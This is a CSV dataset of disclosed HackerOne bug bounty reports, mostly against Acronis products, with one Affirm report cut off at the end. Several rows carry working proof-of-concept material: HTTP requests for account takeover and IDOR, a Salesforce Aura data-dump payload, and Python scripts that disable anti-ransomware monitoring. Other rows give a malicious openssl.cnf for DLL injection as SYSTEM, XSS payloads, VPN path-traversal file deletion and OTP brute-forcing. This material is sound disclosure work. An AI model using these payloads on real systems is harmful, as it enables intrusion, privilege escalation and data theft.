Company Name,Company Size,Open Source,Company Revenue,Bounty Awarded,Severity Rating,Severity Score,Weakness,Report Title,Report Description,URL,Company State,Company Country,Company City,Report Year,Report Month,Report Day,Report Hour,Report Minute
Acronis,1001-5000,0.0,1m-10m,$337.00,Medium,5.45,Violation of Secure Design Principles, Account Takeover on unverified emails in File Sync & Share ,"0xcrypto  submitted a report to Acronis.Jun 24th (2 years ago)Summary
The name change functionality in File Sync & Share is expected to change the name in File Sync & Share. But the API endpoint used in it also allows changing email to any email without having to verify the email. The login email stays the same but the email within File Sync & Share application changes to the new email without verification. This allows user to pretend to be someone else. If the victim has not verified his email, the bug can allow attacker to take over his File Sync & Share account.
Steps to Reproduce

Given the attacker has user access to the File Sync & Share, Login (as attacker) at https://mc-beta-cloud.acronis.com/fc/access.
In the dashboard of File Sync & Share ie. https://mc-beta-cloud.acronis.com/fc/access#/nodes, click on right top Profile button and click on your name. A modal should open which allows you to change the name.
Image F880834: Screenshot_2020-06-24_16-53-03.png 100.48 KiBZoom in Zoom out Copy Download
After the modal box appears, you can see that the email field is disabled. To change it, click on save while capturing the request in any proxy like Burpsuite. The request should look like:

Code 1.12 KiBWrap lines Copy Download1PUT /fc/api/v1/account HTTP/1.1
2Host: mc-beta-cloud.acronis.com
3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://mc-beta-cloud.acronis.com/fc/access
8Content-Type: application/json;charset=utf-8
9ACCESS_WEB_UI: ACCESS_WEB_UI
10X-CSRF-Token: L+0MN5lQqnozdt86Ot276c10PuwLrvpSCK0MrInGkuz5Ei29eyEy8VN37jELA+CwUFHWbEZq3oOv3CUpJMKNvA==
11Content-Length: 74
12DNT: 1
13Connection: close
14Cookie: NodesTable_state=%7B%22columnInfo%22%3A%7B%7D%7D; host=""https://mc-beta-cloud.acronis.com""; accountsrv_locale=en; device_cookie=gAAAAABe8yaMOtGcfCPWSB1PAHZPMAVgHdifpxs35gAsVWeeav-xAM_N4jBNUxCpMTK499VvRQ3DsnLAuX822D8JwxrjZCeD9v2GMc7MiM-NdDdybJIOrrGXNTQyE1UYSdnRU5rmU2unZ16UFsDY78M6rDwcIgU4U7lOsIaKAzrSIOZrr-xvd0JcspJ6oASazUioge-kI2bg; rest_access_token=L%2B0MN5lQqnozdt86Ot276c10PuwLrvpSCK0MrInGkuz5Ei29eyEy8VN37jELA%2BCwUFHWbEZq3oOv3CUpJMKNvA%3D%3D; _activecho_session=46a70775f93123cc9bd6485f0b8fb02c; server_return_to=%2Ffc%2Faccess
15
16{""name"":""Staff Member"",""email"":""0xcrypto+staffmember1@wearehackerone.com""}

The email parameter in the above request is changeable. Enter email of any unverified user (you can also enter any email you wish to use even if it is not registered):

Code 50 BytesWrap lines Copy Download1{""name"":""Human Resource"",""email"":""hr@acronis.com""}
If you get email already taken, the email has been already verified by the user and account takeover is not possible. So try any other email.
If you get 204 No Content the email has been changed successfully and account takeover is successful.
To verify if email has been changed or not, you can go to https://mc-beta-cloud.acronis.com/fc/access#/log within your account.
This does not changes the email ID for the main profile but only File Sync & Share ie. the attacker can login using the old credentials but the new Email is shown everywhere within the File Sync & Share.
I tested the folder/file sharing feature after taking over the account and found that the email used to login can no longer be invited and the email changed using this method is now available to be invited. While the invites goes in the new email, the account is controlled by the attacker.
If the administrator tries to check the email, the taken over email is not reflected in Management Control Dashboard. If the victim verifies his email after the takeover and tries to access File Sync & Share, he gets the error This account has not been created yet but his account gets verified.
Image F880837: Screenshot_2020-06-24_16-58-38.png 169.47 KiBZoom in Zoom out Copy Download
So the attack is quite stealth.
I haven't tested other applications and whether this taken over email is reflected in other places or not. But I suspect that it gets reflected in other applications as well.
Impact
The attacker could trick the users by pretending to be anyone. Also, the attacker could steal important files by taking over unverified accounts.2 attachments:F880834: Screenshot_2020-06-24_16-53-03.pngF880837: Screenshot_2020-06-24_16-58-38.png0xcrypto   posted a comment. Jun 24th (2 years ago)A small correction. If the administrator has already created an account for the victim, it cannot be claimed as the api will give ""has already been taken"" error message. So the bug is for unclaimed emails ie. the email addresses not having any account. But if the victim's account is created after the attacker can claimed the email, the account gets created within the Management Console. The victim will get his account created but visting any application will result in ""This account has not been created yet"" error message. So it is like claiming email without verification, but leads to account takeover if the adminstrator creates account with the same email.0xcrypto   posted a comment. Jun 25th (2 years ago)I am also able to modify any field if the field name is known. For example, I was able to change locale using the following request on the same endpoint.
Code 1.21 KiBWrap lines Copy Download1PUT /fc/api/v1/account HTTP/1.1
2Host: mc-beta-cloud.acronis.com
3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://mc-beta-cloud.acronis.com/fc/access
8Content-Type: application/json;charset=utf-8
9ACCESS_WEB_UI: ACCESS_WEB_UI
10X-CSRF-Token: bB8Ivl01f9xuzKZnZvalDK0icTLl15KYYg/9gMJRXhM77dbypblQEGhX2qV/689PrEJ03U27KXANlL9ygjkLDA==
11Content-Length: 83
12DNT: 1
13Connection: close
14Cookie: NodesTable_state=%7B%22columnInfo%22%3A%7B%7D%7D; LinksTable_state=%7B%22columnInfo%22%3A%7B%7D%7D; sync_and_share_nodes_filter=%22%22; accountsrv_locale=en; device_cookie=gAAAAABe9L03MKfVDiJefTHoLzdBzZ147xlqKl8UjqENRTbUGmrcRKtymQekjeJwsDL17oZr5-_Ldfa84EGH_sLjeU0wWHL8ztOhAYa4Kzf575IzKBE85Gno2gGW9Mw6yp2TGwq5CLn-_PmLCksxlwn2e77VmCOs9Fn0ZA3HfpNqkSuSGJfiPRHtMY7qmzOGaMw-MGJLTN63; rest_access_token=bB8Ivl01f9xuzKZnZvalDK0icTLl15KYYg%2F9gMJRXhM77dbypblQEGhX2qV%2F689PrEJ03U27KXANlL9ygjkLDA%3D%3D; _activecho_session=c83d0f1ec8417ad4b622bcd29fc594e5; server_return_to=%2Ffc%2Faccess; host=""https://mc-beta-cloud.acronis.com""
15
16{
17""name"":""Staff Member"",
18""email"":""0xcrypto+one@wearehackerone.com"",
19""locale"":""es""
20}
Image F882601: Screenshot_2020-06-25_20-45-07.png 98.27 KiBZoom in Zoom out Copy Download1 attachment:F882601: Screenshot_2020-06-25_20-45-07.pngstushieva Acronis staff  changed the status to Needs more info. Jun 25th (2 years ago)Hi, @0xcrypto. Thanks for your report!
Could you please clarify, how is it possible to takeover the account? As far as I can see it is not possible to change email for another user.
My steps:

Change email in Files Sync & Share as you described
Go to Management Console and create another account with email address from previous step
Activate account and open File Sync & Share

In File Sync & Share there is an error ""This account has not been created yet"".
So the only possible impact I see is that user registered with the same email will not be able to access File Sync & Share.0xcrypto   changed the status to New. Updated Jun 25th (2 years ago)Hi, @stushieva,
The user will not be able to access File Sync & Share but it gets severe when someone tries to share file to the victim's claimed email.
Try sharing a file to the attacker's first account. You will find that attacker's login email is no longer acceptable in the share feature. But if you try to share the file to the victim's email, file gets shared, an email is sent to the victim's account but the file shows up in the attacker's account.
If you look from the administrator's perspective, the claimed email still belongs to the victim within the admin's dashboard. Also, if the victim tries to verify his email, his account gets marked as verified and shows up within the admin's dashboard as well. So if the admin is not aware of victim's account being locked out, the administrator or any other user may end up sharing files or folders with the victim's account which is in control of the attacker.
So it is kinda account takeover as the account which was meant to belong to the victim now belongs to the attacker.stushieva Acronis staff  updated the severity from high to low. Jun 26th (2 years ago)stushieva Acronis staff  changed the status to Triaged. Jun 26th (2 years ago)Thanks for clarification.
Your report passed initial review and passed to the security team. We will be back to you soon.0xcrypto   posted a comment. Jun 26th (2 years ago)Hi @stushieva,
I think the severity of this bug should not be low as it is also possible to take over accounts outside an organization as well. For example, an attacker can buy the Acronis service and create as many users as he wants and later claim another organization's email addresses ie by brute forcing the endpoint, the attacker could easily claim common email addresses of victim organization. Since the victim organization can create and even verify accounts for such claimed email, the victim may think his locked account is a technical issue and others may keep sharing files and folders without knowing.
Kindly reassess the vulnerability and update the severity accordingly.stushieva Acronis staff  posted a comment. Jul 1st (2 years ago)@0xcrypto,
After internal discussion we decided, that this is Medium severity issue.
As per your last comment, attacker will need to have an account in that organization (tenant in terms of Acronis Cyber Cloud). Otherwise, attacker will not have access to files shared by victim organization users and users of the organization will have normal access to File Sync & Share.
Thanks!stushieva Acronis staff  updated the severity from low to medium. Jul 1st (2 years ago)0xcrypto   posted a comment. Jul 1st (2 years ago)Thank you @stushieva.Acronis  rewarded 0xcrypto with a $337 bounty. Jul 7th (2 years ago)Thanks and happy bug hunting!0xcrypto   posted a comment. Jul 7th (2 years ago)Thank You :)ibnualam   filed a duplicate (#962484) and was invited to participate in this report. Aug 19th (2 years ago)security-bot Acronis staff  closed the report and changed the status to Resolved. Feb 10th (2 years ago)Thanks for catching this bug!
We have fixed it, please confirm that you are no longer able to reproduce the issue.stushieva Acronis staff  requested to disclose this report. Jun 16th (about 1 year ago)0xcrypto   agreed to disclose this report. Jun 16th (about 1 year ago)  This report has been disclosed. Jun 16th (about 1 year ago)",https://hackerone.com/reports/906790,Massachusetts,United States,Burlington,2020,6,24,11,47
Acronis,1001-5000,0.0,1m-10m,$100.00,Low,2.0,Information Disclosure,[acronis.secure.force.com] - Insecure Salesforce default/custom object permissions leads to information disclosure,"amsda  submitted a report to Acronis.Oct 31st (2 years ago)Hi there,
I know that this domain https://acronis.secure.force.com is not listed in scope but I thought it would be a good idea to share this finding with you because this endpoint is leaking internal information/meetings.
Target: The Salesforce instance at https://acronis.secure.force.com.
Description: The web application at https://acronis.secure.force.com is built using Salesforce. Salesforce is a CRM for developing web applications providing a number of abstractions to simplify the development of data-driven applications. In particular, the Aura framework enables developers to build applications using reusable components exposing an API in order for the components to interact with the application.
During testing it was discovered that the Salesforce instance has loose permissions on the Event object for unauthenticated Guest users.
Therefore, a malicious attacker may be able to extract sensitive information belonging to other users of the application. To do this, an unauthenticated attacker may craft a HTTP request directly to the Aura API at https://acronis.secure.force.com/acc/aura, using built-in controller methods normally used by the Salesforce Lightning components.
Steps to Reproduce:
1) Ensure Burp Suite is sniffing all HTTP(S) requests in the background;
2) Navigate to https://aaroncostello-developer-edition.eu45.force.com, this is to retrieve a template aura request for use;
3) Find a POST request in Burp's Proxy history to the /s/sfsites/aura endpoint;
4) Send it to the repeater;
5) Modify both the Host header and Burp's target field to acronis.secure.force.com
6) Modify the POST request to /acc/aura
7) Change the message POST parameter to the payload below. Please note that all other parameters should remain untouched, and that in this example payload, a pageSize of 100 is used for speed however more records can be retrieved:
Event
Code 358 BytesWrap lines Copy Download1{""actions"":[{""id"":""123;a"",""descriptor"":""serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems"",""callingDescriptor"":""UNKNOWN"",""params"":{""entityNameOrId"":""Event"",""layoutType"":""FULL"",""pageSize"":100,""currentPage"":0,""useTimeout"":false,""getCount"":false,""enableRowActions"":false}}]}
8) Submit the request
9) The response contains sensitive information belonging to other users.
Remediation: Enforce record level security (RLS) on the vulnerable object to ensure records are only able to be retrieved by the record owner, and privileged users of the application.
Thank you
Impact
The Salesforce instance does not enforce sufficient authorization checks when specific objects are requested. As such, an unauthenticated attacker may be able to extract sensitive data from the records in these objects which contains information of other users. This includes internal information/meetings.",https://hackerone.com/reports/1023572,Massachusetts,United States,Burlington,2020,10,31,18,24
Acronis,1001-5000,0.0,1m-10m,$500.00,High,7.4,Improper Certificate Validation,Acronis True Image  (Windows) does not validate server certificate on a TLS connection,aapo  submitted a report to Acronis.Dec 10th (2 years ago)security-bot Acronis staff  posted a comment. Dec 10th (2 years ago)stushieva Acronis staff  changed the status to Triaged. Dec 15th (2 years ago)Acronis  rewarded aapo with a $500 bounty. Dec 22nd (2 years ago)security-bot Acronis staff  closed the report and changed the status to Resolved. May 11th (2 years ago)stushieva Acronis staff  requested to disclose this report. Aug 5th (about 1 year ago)aapo   agreed to disclose this report. Aug 5th (about 1 year ago)  This report has been disclosed. Aug 5th (about 1 year ago),https://hackerone.com/reports/1056144,Massachusetts,United States,Burlington,2020,12,10,19,45
Acronis,1001-5000,0.0,1m-10m,$250.00,High,7.4,Improper Certificate Validation,Acronis True Image 2021 (windows) does not validate server hostname on a login TLS connection,aapo  submitted a report to Acronis.Jan 3rd (2 years ago),https://hackerone.com/reports/1070533,Massachusetts,United States,Burlington,2021,1,3,11,21
Acronis,1001-5000,0.0,1m-10m,$200.00,Medium,5.4,Missing Authentication for Critical Function,anti_ransomware_service.exe REST API does not require authentication,"mjoensen  submitted a report to Acronis.Apr 24th (3 years ago)anti_ransomware_service.exe exposes a REST API that can be used by everyone, even unprivileged users. This API is used to communicate from the Acronis True Image 2020 GUI to the anti_ransomware_service.exe. This can be exploited to add an arbitary malicious executable to the whitelist or even exclude the entire drive from being monitored by anti_ransomware_service.exe.
Add executable to whitelist, steps to reproduce:

Run the python script ""add_executable_to_whitelist.py"". This could of course be written in a compiled language, such that the executable did not need an installed interpreter. Example code can be found below.
Verify in the Acronis True Image 2020 GUI that the executable ""C:\ProgramData\ransomware_exe.exe"" is whitelisted.

add_executable_to_whitelist.py:
""""""
import requests
import json
put_headers = {'User-Agent': 'AcronisRestClient', ""Accept"": ""application/json"",
""Content-Type"":""application/json""}
data = {
""additions"" : [
{
""path"" : ""C:\ProgramData\ransomware_exe.exe""
}
],
""removals"" : []
}
r1 = requests.put('http://localhost:6109/lists/processImages/white', headers=put_headers, data=json.dumps(data))
print(r1.content)
""""""
Exclude drive from monitoring, steps to reproduce:

Run the python script ""exclude_drive_from_anti_ransomware.py"". This could of course be written in a compiled language, such that the executable did not need an installed interpreter. Example code can be found below.
Verify in the Acronis True Image 2020 GUI that the path ""C:*"" is excluded.

exclude_drive_from_anti_ransomware.py:
""""""
import requests
import json
import time
put_headers = {'User-Agent': 'AcronisRestClient', ""Accept"": ""application/json"",
""Content-Type"":""application/json""}
data = {
""additions"" : [
{
""path"" : ""C:\*""
}
],
""removals"" : []
}
r1 = requests.put('http://localhost:6109/lists/excludes', headers=put_headers, data=json.dumps(data))
print(r1.content)
""""""
Impact
This could silently disable the anti_ransomware_service.exe by whitelisting the specific ransomware executable or excluding the entire system drive from inspection.",https://hackerone.com/reports/858608,Massachusetts,United States,Burlington,2020,4,24,11,41
Acronis,1001-5000,0.0,1m-10m,$250.00,High,8.1,Privilege Escalation,Arbitrary DLL injection in mmsminisrv (Acronis Managed Machine Service Mini),"adr  submitted a report to Acronis.Jul 28th (2 years ago)During initialization, mms_mini.exe (service binary of mmsminisrv) loads library C:\Program Files (x86)\Common Files\Acronis\Home\libssl10.dll. The library then tries to load non-existing file: C:\bs_hudson\workspace\mod-openssl-fips-win\205\product\out\standard\vs_2013_release\OpenSSL\ssl\openssl.cnf. The path seems to be hardcoded leftover from compilation.
Image F926518: non-existent.png 12.70 KiBZoom in Zoom out Copy Download
Because by default any user is able to create directories  on C:\ drive, it is possible to create missing directories and missing file (openssl.cnf). The OpenSSL config file implements support for loading additional DLL modules. Attacker may point to arbitrary DLL which will be loaded by service running with Local System privileges. Once service is restarted (e.g. due to system reboot), the planted library is loaded by the service and arbitrary code is executed. The code would typically add new Administrative user to the Windows system or establish reverse shell connection.
Successful injection of arbitrary library is shown on procmon log:
Image F926535: injection.png 17.97 KiBZoom in Zoom out Copy Download
Steps to reproduce

Create directories: mkdir C:\bs_hudson\workspace\mod-openssl-fips-win\205\product\out\standard\vs_2013_release\OpenSSL\ssl
Inside, create openssl.cnf file with following content (replace DLL path with any path you wish):
Code 190 BytesWrap lines Copy Download1openssl_conf = openssl_init
2[openssl_init]
3engines = engine_section
4[engine_section]
5woot = woot_section
6[woot_section]
7engine_id = woot
8dynamic_path = c:\\temp\\cqbeacondll.dll
9init = 0
10```

Plant arbitrary DLL under dynamic_path location.
Wait for service to start (or force it by rebooting system)

Impact
After successful attack, low privileged local user can elevate privileges up to Local System (the highest Windows privilege). The vulnerability can be also exploited by malware with local system access.3 attachments:F926518: non-existent.pngF926535: injection.pngF926553: openssl.cnf",https://hackerone.com/reports/944735,Massachusetts,United States,Burlington,2020,7,28,9,14
Acronis,1001-5000,0.0,1m-10m,$150.00,High,7.95,Cross-site Scripting (XSS) - Stored,Blind Stored XSS in https://partners.acronis.com/admin which lead to sensitive information/PII leakage,mansishah  submitted a report to Acronis.Nov 7th (2 years ago),https://hackerone.com/reports/1028820,Massachusetts,United States,Burlington,2020,11,7,7,48
Acronis,1001-5000,0.0,1m-10m,$50.00,Low,2.0,None,DOM based XSS in store.acronis.com/<id>/purl-corporate-standard-IT [cfg parameter],"f_m  submitted a report to Acronis.Aug 27th (2 years ago)Summary
Hi Acronis team, i found a DOM based XSS in store.acronis.com, this vulnerability arise from a missing escape for the \ character.
Steps To Reproduce

go to: https://store.acronis.com/837/purl-corporate-standard-IT?cart=201591&deliveryEmail=f_m%2B5%40wearehackerone.com&deliveryFirstname=fmfm&deliveryEmailRetype=f_m%2B5%40wearehackerone.com&deliveryPhone1=fmfm&deliveryLastname=fmfmfm&x-uid=%22%3e%3ctestxss&quantity_201591=1&recommendation=cloud_20off&recommendation=ACPPLP&x-page=https://www.acronis.com/it-it/business/backup/server/purchasing/&tracking=&x-segment=corporate&cfg=\\ciao%27}];prompt();var%20asd=[{%27foo%27:%27bar
a prompt appear

Image F965980: reflected_xss.JPG 159.69 KiBZoom in Zoom out Copy Download
Impact
since it's in the store subdomain, this can lead to PII stealing
Recommendations
escape the \ character in \
Impact
since it's in the store subdomain, this can lead to PII stealing1 attachment:F965980: reflected_xss.JPG",https://hackerone.com/reports/968690,Massachusetts,United States,Burlington,2020,8,27,13,56
Acronis,1001-5000,0.0,1m-10m,$50.00,Low,2.0,Cross-site Scripting (XSS) - Reflected,Cross Site Scripting (Reflected) on https://www.acronis.cz/,"darkdream  submitted a report to Acronis.Jan 22nd (2 years ago)Summary
You can post javascript and html code in form fields
steps :
1-go to vulnerability link : https://www.acronis.cz/poptavka-acronis/
2- enter this javascript code ""><script>alert(1);</script> in form field for xss and enter a+href=""https://bing.com""Test</a> for html injection.
Impact
Impact
1- Cookie stealing
2- Pishing attacks
3- URL redirectionsecurity-bot Acronis staff  posted a comment. Jan 22nd (2 years ago)Hi @darkdream
Thanks for participating in Acronis bug bounty program!
Our security team usually replies within 1-2 business days.
Meanwhile, I'd recommend you to check out our policy.stushieva Acronis staff  updated the severity from medium to low. Jan 22nd (2 years ago)stushieva Acronis staff  changed the status to Triaged. Jan 22nd (2 years ago)Acronis  rewarded darkdream with a $50 bounty. Jan 26th (2 years ago)Thanks for participating in Acronis bug bounty program! Bounty is transferred to your account.
Happy bug hunting and we are waiting for new reports from you.security-bot Acronis staff  closed the report and changed the status to Resolved. Feb 3rd (2 years ago)Thanks for catching this bug!
We have fixed it, please confirm that you are no longer able to reproduce the issue.darkdream   posted a comment. Feb 5th (2 years ago)it's fixedstushieva Acronis staff  requested to disclose this report. Jun 22nd (about 1 year ago)darkdream   agreed to disclose this report. Nov 17th (about 1 year ago)  This report has been disclosed. Nov 17th (about 1 year ago)dharmarajmangrola1118   filed a duplicate (#1406416) and was invited to participate in this report. Nov 22nd (12 months ago)dharmarajmangrola1118   posted a comment. Nov 22nd (12 months ago)how to withdraw money?",https://hackerone.com/reports/1084156,Massachusetts,United States,Burlington,2021,1,22,7,48
Acronis,1001-5000,0.0,1m-10m,$100.00,Medium,5.45,Insecure Direct Object Reference (IDOR),IDOR on www.acronis.com API lead to steal private business user information,"f_m  submitted a report to Acronis.May 2nd (2 years ago)Summary
Hi acronis team, i found an endpoint : www.acronis.com/en-us/api/v1/lead/id:929-HVV-335&token:_mch-acronis.com-<integer value> that is vulnerable to IDOR. with this vulnerability an attacker can steal private info such as company name, user name and surname, telephone number etc...
Steps To Reproduce

once logged in into account.acronis.com go to :  https://www.acronis.com/en-us/api/v1/lead/id:929-HVV-335&token:_mch-acronis.com-1614775941608-39235
you will see all my private account information

███
NOTE: the only part that change from account to account is the last part of the token(the last 5 digits) and since it's an integer is totally guessable.
Recommendations
implement a check on the endpoint or use a random token value instead of an integer
Impact
an attacker can steal private info from other users profile",https://hackerone.com/reports/1182465,Massachusetts,United States,Burlington,2021,5,2,13,44
Acronis,1001-5000,0.0,1m-10m,$400.00,Medium,5.45,Insecure Direct Object Reference (IDOR),IDOR vulnerability (Price manipulation),"spookhorror  submitted a report to Acronis.Nov 17th (about 1 year ago)Target: acronis.cz
Step to Reproduce
1.Go to acronis.cz
2.buy any product in this case i am going to buy this https://www.acronis.cz/produkt/acronis-cyber-protect-home-office/   for test
3.fill up details
4.go to burpsuite turn on intercept
5.click on buy now
6.check request in intercept change price of product and click on forward
Check out  price_manipulation_POC.mkv for Practical Demonstration
Impact
attacker can reduce the price of the Product.2 attachments:F1517264: price_manipulation_POC.mkvF1517265: Price_manipulation.PNG",https://hackerone.com/reports/1403176,Massachusetts,United States,Burlington,2021,11,17,16,39
Acronis,1001-5000,0.0,1m-10m,$250.00,Medium,5.45,Path Traversal,Local File Disclosure /Delete On [us-az-vpn.acronis.com],"10nf  submitted a report to Acronis.Jul 15th (2 years ago)Cisco ASA VPN server hosted on

https://us-az-vpn.acronis.com

was found to be using an outdated version that suffers from a Local File Disclosure /Delete vulnerability. Through this vulnerability an unauthenticated remote attacker can read and delete the contents of any file stored on the VPN server without authentication; including the VPN ""lua"" source code files .
This vulnerability can delete any file and break the vpn , so it should be carefully tested
The files will be restored after VPN restart
Technical details:
Affected Endpoint for delete :

https://us-az-vpn.acronis.com/+CSCOE+/session_password.html

Affected Cookie Parameter: token
Request Method: GET
Affected Endpoint for read files:

https://us-az-vpn.acronis.com/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../

Affected Cookie Parameter: textdomain
Request Method: GET
Image F908308: lfd.png 123.70 KiBZoom in Zoom out Copy Download
This vulnerability is critical and can't be tested on production environment as it will break the VPN by deleting any file , so I tested on local environment .
We need to verify that the vulnerability exists :

Firstly I downloaded the vulnerable code and compared it with the code from local environment , and they were identical
Image F908308: lfd.png 123.70 KiBZoom in Zoom out Copy Download
Secondly, When this path exists +CSCOE+/session_password.html this means the vulnerability isn't patched , and if the response is 404 that means the vulnerability is patched

Image F908309: password.png 80.85 KiBZoom in Zoom out Copy Download
Exploiting the vulnerability on local environment :

Trying to download a file :

Code 121 BytesWrap lines Copy Download1https://192.168.1.100/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/wrong_url.html&default-language&lang=../
Image F908307: file_before_delete.png 58.09 KiBZoom in Zoom out Copy Download

Exploit the vulnerability using this request :

Code 609 BytesWrap lines Copy Download1GET /+CSCOE+/session_password.html HTTP/1.1
2Host: 192.168.1.100
3Connection: close
4Cache-Control: max-age=0
5Upgrade-Insecure-Requests: 1
6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
7Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
8Sec-Fetch-Site: cross-site
9Sec-Fetch-Mode: navigate
10Sec-Fetch-User: ?1
11Cookie: token=../../../../../../+CSCOE+/wrong_url.html
12Sec-Fetch-Dest: document
13Accept-Encoding: gzip, deflate
14Accept-Language: en-US,en;q=0.9
The file is read and stored in webvpn cookie and then deleted
Image F908305: delete_file.png 48.55 KiBZoom in Zoom out Copy Download

Trying to read the file again after delete :

Code 121 BytesWrap lines Copy Download1https://192.168.1.100/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/wrong_url.html&default-language&lang=../
Image F908306: file_after_delete.png 50.14 KiBZoom in Zoom out Copy Download
Impact
The vulnerability allows a remote unauthenticated attacker to read and download files from Cisco ASA VPN server, thus an attacker can use the vulnerability to read and delete internal files from the server such as:

The VPN's LUA source code files
Delete any file
Break the vpn web portal
Prevent users from authenticate via web portal
5 attachments:F908305: delete_file.pngF908306: file_after_delete.pngF908307: file_before_delete.pngF908308: lfd.pngF908309: password.png",https://hackerone.com/reports/924407,Massachusetts,United States,Burlington,2020,7,15,13,1
Acronis,1001-5000,0.0,1m-10m,$250.00,High,7.9,Privilege Escalation,Local privilege escalation via insecure MSI file,"twvyy3vyaw8k  submitted a report to Acronis.Jan 5th (2 years ago)Summary
I've found a vulnerability which leads to a local privilege escalation starting from a non-admin user.
When True Image client installs it drops 2 MSI files into C:\Windows\Installer folder.
Since this folder (by default) is readable by anyone, a non-admin user can execute commands like msiexec /fa installer_name.msi, which forces installer_name.msi to ""repair"" the program.
One of these 2 MSIs (i can't named it because MSI file names are random and unique for every installation) when forced to repair it creates a dll in %TEMP%\random_name and then, after some time, MsiExec.exe loads it. Since MsiExec.exe auto-escalate privileges when executed and %TEMP% is writable by anyone, this behavior could be abused to gain nt authority\system privileges.
Steps To Reproduce

Open %TEMP% and C:\Windows\Installer
Locate the MSI file in the installer folder: it's 1.3 GB large and has Acronis as author 
Open cmd.exe and execute msiexec /fa C:\Windows\Installer\installer_name.msi.  After few seconds a new folder will appear in %TEMP%
Replace schedule.dll inside that folder with the schedule.dll attachment  in this report
Wait until the process finishes. After some time a UAC should prompt, just select ""no""
A new cmd should pop up. Type whoami to confirm the new privileges

I've also recorded a PoC video in case something it's not clear.
Recommendations
Do not use local %TEMP% to create schedule.dll, use C:\Windows\TEMP.
Impact
LPEs like this one are often used by malwares to evade antivirus engines, install rootkits, spread over the network, etc...
A malware author could use this exploit to target Acronis end users.2 attachments:F1145030: true_image_LPE_PoC.mp4F1145031: schedule.dll",https://hackerone.com/reports/1071832,Massachusetts,United States,Burlington,2021,1,5,10,38
Affirm,1001-5000,0.0,over-1b,"$3,000.00",Critical,9.5,Improper Authentication - Generic,Absence of Token expiry leads to Unauthorized login Access,"yogesh_ojha  submitted a report to Affirm.Dec 31st (3 years ago)Summary
While doing the testing for the mobile app, I observed out that it is possible to bypass the authentication and gain unauthorized access to the user's account bu brute-forcing the PIN due to lack of login token expiry.
The way affirm mobile login works is that,
User inputs the phone number
It then makes a call to an API endpoint /api/v3/login/phone/
Code 282 BytesWrap lines Copy Download1POST /api/v3/login/phone/ HTTP/1.1
2Content-Type: application/json; charset=UTF-8
3Content-Length: 40
4Host: hackerone.affirm-odin.com
5Connection: close
6Accept-Encoding: gzip, deflate
7User-Agent: okhttp/3.13.1
8Affirm-User-Agent: Affirm-Android
9
10{""channel"":""sms"",""address"":""7022170000""}
This endpoint /api/v3/login/phone/ in turn generates a token and sends in the response.
The response looks something similar to this
Code 411 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Date: Tue, 31 Dec 2019 11:53:27 GMT
3Content-Type: application/json
4Connection: close
5Server: openresty
6Vary: Accept-Encoding
7Affirm-Device: XXX=
8Affirm-Client: XXXX-
9cache-control: private, no-cache, no-store, must-revalidate
10X-Affirm-Request-Id: a3bcdedb-0e18-4760-c796-1cd60158f86c
11Strict-Transport-Security: max-age=86400
12Content-Length: 299
13
14{""response_url"": ""/api/v3/login/phone/SOMETOKEN""}
Another call to the api is made to the URL obtained from the above response_url This API request looks like this
Code 322 BytesWrap lines Copy Download1POST /api/v3/login/phone/SOMETOKEN HTTP/1.1
2Content-Type: application/json; charset=UTF-8
3Content-Length: 19
4Host: hackerone.affirm-odin.com
5Connection: close
6Accept-Encoding: gzip, deflate
7Affirm-User-Agent: Affirm-Android
8Affirm-App-Version: 3.62.3
9Affirm-App-Version-Code: 312
10Affirm-OS-Version: 22
11
12{""response"":""0000""}
Since SOMETOKEN in the above request doesn't get expired, this request can be sent to Intruder or similar tools to brute force the response OTP parameter.
Once the response is valid, this can be verified by the 200 status obtained in the response and the length of the response.
Like this,
Image F672314: 1.PNG 26.49 KiBZoom in Zoom out Copy Download
The response will be
Code 661 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Date: Tue, 31 Dec 2019 12:30:58 GMT
3Content-Type: application/json
4Connection: close
5Server: openresty
6Vary: Accept-Encoding
7Affirm-Device: eyJkZXZpY2VfaWQiOiAiZDk3NTcyNTQtYmZkNS00NGFiLWE1ZjQtMTk3YzI2NzhjMTQyIn0=
8Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk
9cache-control: private, no-cache, no-store, must-revalidate
10X-Affirm-Request-Id: dc1a2835-e8bc-4f0e-cf08-05c50c942eca
11Strict-Transport-Security: max-age=86400
12Content-Length: 109
13
14{""status"": ""authenticated"", ""token"": null, ""user_id"": ""1479-5770-XGGL"", ""expiration"": ""3019-12-31T17:17:38Z""}
This response contains Affirm-Client which is like a session ID, later used to make a request.
To verify if this is the actual session ID or not, this can be done by making a request to the api
Code 428 BytesWrap lines Copy Download1GET /api/v2/users/1479-5770-XGGL HTTP/1.1
2Host: hackerone.affirm-odin.com
3Connection: close
4Accept-Encoding: gzip, deflate
5User-Agent: okhttp/3.13.1
6Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk
7Affirm-Platform: android
8Affirm-User-Agent: Affirm-Android
9Affirm-App-Version: 3.62.3
10Affirm-App-Version-Code: 312
11Affirm-OS-Version: 22
The user ID can also be obtained from the above response.
